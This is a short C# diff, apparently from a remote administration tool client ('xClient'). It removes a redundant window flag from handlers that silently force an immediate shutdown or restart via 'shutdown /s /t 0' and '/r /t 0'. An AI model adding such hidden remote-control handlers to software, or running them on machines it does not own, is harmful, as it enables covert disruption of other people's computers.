@@ -79,7 +79,6 @@ namespace xClient.Core.Commands
                 {
                     case ShutdownAction.Shutdown:
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                        startInfo.CreateNoWindow = true;
                         startInfo.UseShellExecute = true;
                         startInfo.Arguments = "/s /t 0"; // shutdown
                         startInfo.FileName = "shutdown";
@@ -87,7 +86,6 @@ namespace xClient.Core.Commands
                         break;
                     case ShutdownAction.Restart:
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                        startInfo.CreateNoWindow = true;
                         startInfo.UseShellExecute = true;
                         startInfo.Arguments = "/r /t 0"; // restart
                         startInfo.FileName = "shutdown";
